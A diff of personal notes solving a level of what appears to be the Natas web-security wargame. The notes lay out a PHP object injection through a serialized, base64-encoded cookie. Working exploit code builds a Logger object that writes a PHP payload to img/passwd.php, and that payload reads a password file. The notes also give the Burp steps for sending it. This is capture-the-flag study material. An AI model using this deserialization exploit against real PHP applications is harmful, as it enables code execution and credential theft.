@@ -34,7 +34,7 @@ Logger class
         
     mylog->log($msg);
         adds $msg to log file. 
-        if $msg = <?php file_get_contents(/etc/natas_webpass/natas27) ?> it should print the password for the next level in the log file
+        if $msg = <?php file_get_contents(/etc/natas_webpass/natas27); ?> it should print the password for the next level in the log file
 
 attack plan:
     create a Logger class
@@ -42,7 +42,7 @@ attack plan:
     make Logger log a $msg containing php code which will get the password
     access the log
 
-our attack vector should be through the drawing cookie using php object injection
+the attack vector should be through the drawing cookie using php object injection
 drawing cookie is seralized and base64 encoded
 
 some code like this should create a Logger
@@ -61,3 +61,41 @@ which will be attached to a request like this
     Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
     Connection: close
 
+in order for this attack to work, a serialized Logger needs to be sent to the server to unpack
+the Logger code on the page source can be modified to suite our needs. 
+since the __destruct method runs at the end of the script, we will use this to get the password
+by changing exitMsg to our payload, it will create or append the password to the value of $logFile
+we know that the page has access to the img/ folder, so we will put the file there.
+we cannot use the picture, because the picture gets rewritten each time the page loads
+remember that in order for the php to execute, the destiation file must have a .php extension
+also, make sure that any double quotes inside the payload are properly esacped.
+
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct(){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="<?php echo file_get_contents(\"/etc/natas_webpass/natas27\");?>";
+            $this->logFile = "img/passwd.php";
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+           	
+        }                       
+    }
+
+$mylog = new Logger();
+
+print base64_encode(serialize($mylog));
+
+paste the encoded payload into the drawing cookie in Burp repeater and send it.
+then, navigate to the newly created img/passwd.php file to retreive the password.
